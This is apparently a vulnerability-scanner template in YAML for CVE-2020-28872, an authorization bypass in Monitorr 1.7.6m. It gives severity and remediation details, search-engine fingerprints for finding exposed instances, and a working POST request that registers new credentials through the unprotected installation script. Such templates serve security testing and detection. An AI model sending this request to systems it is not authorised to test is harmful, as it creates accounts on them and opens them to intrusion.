id: CVE-2020-28872

info:
  name: Monitorr 1.7.6m Authorization Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: An authorization bypass vulnerability in Monitorr v1.7.6m in Monitorr/assets/config/_installation/_register.php allows an unauthorized person to create valid credentials.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Upgrade Monitorr to version 1.7.7 or later to fix the authorization bypass vulnerability (CVE-2020-28872).
  reference:
    - https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
    - https://www.exploit-db.com/exploits/48981
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/Live-Hack-CVE/CVE-2020-28872
    - https://github.com/sec-it/monitorr-exploit-toolkit
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-28872
    cwe-id: CWE-863
    epss-score: 0.43551
    epss-percentile: 0.97486
    cpe: cpe:2.3:a:monitorr:monitorr:1.7.6m:*:*:*:*:*:*:*
  metadata:
    vendor: monitorr
    product: monitorr
    shodan-query: http.favicon.hash:"-211006074"
    fofa-query: icon_hash="-211006074"

http:
  - method: POST
    path:
      - "{{BaseURL}}/assets/config/_installation/_register.php?action=register"

    body: |
      user_name={{user_login}}&user_email={{user_email}}&user_password_new={{user_password}}&user_password_repeat={{user_password}}&register=Register

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Done."
        part: body
